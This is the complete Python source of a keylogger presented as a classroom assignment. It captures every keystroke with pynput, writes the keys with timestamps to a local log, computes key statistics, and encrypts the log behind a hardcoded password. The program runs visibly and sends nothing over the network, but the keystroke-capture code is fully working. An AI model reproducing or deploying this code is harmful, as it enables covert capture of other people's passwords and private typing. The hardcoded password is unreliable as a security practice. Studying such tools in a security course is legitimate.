'''
This is a a Keylogger made for the 
expressed purpose of an in class 
assignment and is not intended for 
use outside of the classroom envirnment


Charles Weber
V3.0


Important Note;
*This code is made for educational purposes
only and is not to be utilized outside of an
educational setting


*To access encrypted data, use "pass"
'''


from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
from collections import Counter
import os
import time


# Program Variables
buffer = ""  # Memory buffer
buffer_size = 50  # Max size of buffer before writing to log file
log_file = "log_file.txt"  # Log file
key_file = "key_file.key"  # File to store the encryption key
password = "pass"  # Password for accessing the encrypted file
key_count = Counter()  # Counter to track key frequencies
total_key_presses = 0  # Total number of key presses captured
special_keys = {"esc", "space", "shift", "ctrl", "alt", "tab", "caps_lock", "enter", "backspace"}  # Keys to exclude from common keys
special_key_count = Counter()  # Counter for special keys
start_time = None  # Variable to track the start time of key logging


# Load or generate the encryption key
def load_or_generate_key():
    if os.path.exists(key_file):
        with open(key_file, "rb") as file:
            return file.read()
    else:
        key = Fernet.generate_key()
        with open(key_file, "wb") as file:
            file.write(key)
        return key


# Initialize the encryption key and cipher
encryption_key = load_or_generate_key()
cipher = Fernet(encryption_key)


# Write the buffer to the log file
def write_to_file(data):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    structured_data = f"{timestamp} {data}\n"
    with open(log_file, "a") as file:
        file.write(structured_data)


# Encrypt the log file
def encrypt_log_file():
    with open(log_file, "rb") as file:
        data = file.read()
    encrypted_data = cipher.encrypt(data)
    with open(log_file, "wb") as file:
        file.write(encrypted_data)


# Decrypt the log file
def decrypt_log_file():
    try:
        input_password = input("Enter the decryption password: ")
        if input_password != password:
            print("Incorrect password! Decryption aborted.")
            return

        with open(log_file, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = cipher.decrypt(encrypted_data)

        with open(log_file, "w") as file:
            file.write(decrypted_data.decode())
        print("Log file decrypted successfully!")
    except Exception as e:
        print(f"An error occurred during decryption: {e}")


# Append statistics to the log file
def append_statistics():
    global buffer, total_key_presses, key_count, special_key_count, start_time
    if buffer:
        write_to_file(buffer)
        buffer = ""

    # Calculate total key presses (including special keys)
    total_keys_including_special = total_key_presses

    # Filter out special keys from the statistics for most common keys
    filtered_key_count = {key: count for key, count in key_count.items() if key not in special_keys}

    # Generate statistics for most common keys
    most_common_keys = Counter(filtered_key_count).most_common(5)
    total_keys_excluding_special = sum(filtered_key_count.values())

    # Calculate typing speed (characters per minute)
    if start_time:
        elapsed_time = (time.time() - start_time) / 60  # Time in minutes
        typing_speed = total_keys_excluding_special / elapsed_time if elapsed_time > 0 else 0
    else:
        typing_speed = 0

    stats = (
        f"Total Key Presses: {total_keys_including_special}\n"
        f"Typing Speed (characters per minute): {typing_speed:.2f} CPM\n"
        "Most Common Keys:\n"
        + "\n".join([f"{key}: {count}" for key, count in most_common_keys])
    )

    with open(log_file, "a") as file:
        file.write("\n--- Statistics ---\n")
        file.write(stats + "\n")


# On key press event
def on_press(key):
    global buffer, total_key_presses, key_count, special_key_count, start_time
    try:
        if start_time is None:
            start_time = time.time()  # Record the first key press time

        if hasattr(key, "char") and key.char is not None:
            if key.char == " ":
                buffer += " "
                key_count["space"] += 1
            else:
                buffer += key.char
                key_count[key.char] += 1
        else:
            key_name = str(key).replace("Key.", "")
            if key_name == "space":
                buffer += " "
                key_count["space"] += 1
            else:
                buffer += f"[{key_name}]"
                special_key_count[key_name] += 1  # Count special key presses
            key_count[key_name] += 1  # Count both special and regular keys
        total_key_presses += 1
        if len(buffer) >= buffer_size:
            write_to_file(buffer)
            buffer = ""
    except Exception as e:
        print(f"Error: {e}")


# On key release event
def on_release(key):
    global buffer
    if key == keyboard.Key.esc:
        append_statistics()
        encrypt_log_file()
        print(f"Log file encrypted. Use password '{password}' to decrypt.")
        return False


# Start the keylogger
def start_keylogger():
    print("Keylogger started. Press 'Esc' to stop and encrypt the log file.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# Main menu
def main():
    print("Keylogger Program")
    print("[1] Start Keylogger")
    print("[2] Decrypt Log File")
    choice = input("Choose an option: ")

    if choice == "1":
        start_keylogger()
    elif choice == "2":
        decrypt_log_file()
    else:
        print("Invalid choice. Exiting.")


if __name__ == "__main__":
    main()